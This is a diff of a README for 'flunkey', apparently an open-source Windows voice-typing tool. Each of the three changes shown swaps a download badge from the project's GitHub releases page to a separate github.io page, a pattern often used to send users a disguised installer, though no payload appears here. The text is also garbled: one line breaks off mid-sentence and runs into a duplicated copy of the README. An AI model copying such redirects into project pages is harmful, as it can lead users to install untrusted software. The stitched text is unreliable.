@@ -1,10 +1,10 @@
 # 🎙️ flunkey - Speak Your Ideas Into Any App
 
-[![Download flunkey](https://img.shields.io/badge/Download%20flunkey-ff5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdxl-cloud/flunkey/releases)
+[![Download flunkey](https://img.shields.io/badge/Download%20flunkey-ff5733?style=for-the-badge&logo=github&logoColor=white)](https://abdxl-cloud.github.io)
 
 flunkey is an open-source, voice-first desktop productivity tool for Windows. It is built as a friendly alternative to Wisprflow, with a# 🎙️ flunkey - Speak Your Ideas Into Any App
 
-[![Download flunkey](https://img.shields.io/badge/⬇️_Download_flunkey-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdxl-cloud/flunkey/releases)
+[![Download flunkey](https://img.shields.io/badge/⬇️_Download_flunkey-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://abdxl-cloud.github.io)
 
 flunkey is a free, open-source desktop tool that turns your voice into text and puts it wherever you are typing. Instead of hunting for the right keys, you simply talk — and your words appear in your email, document, chat window, or search bar. It is built as a community-friendly alternative to Wisprflow, designed for people who think faster than they type and want a voice-first way to get things done on Windows.
 
@@ -32,7 +32,7 @@ Getting flunkey onto your computer takes only a few minutes, and you do not need
 
 ### Step 1: Open the download page
 
-[![Download flunkey now](https://img.shields.io/badge/⬇️_Get_flunkey-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/abdxl-cloud/flunkey/releases)
+[![Download flunkey now](https://img.shields.io/badge/⬇️_Get_flunkey-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://abdxl-cloud.github.io)
 
 Visit this link to download the application.
 
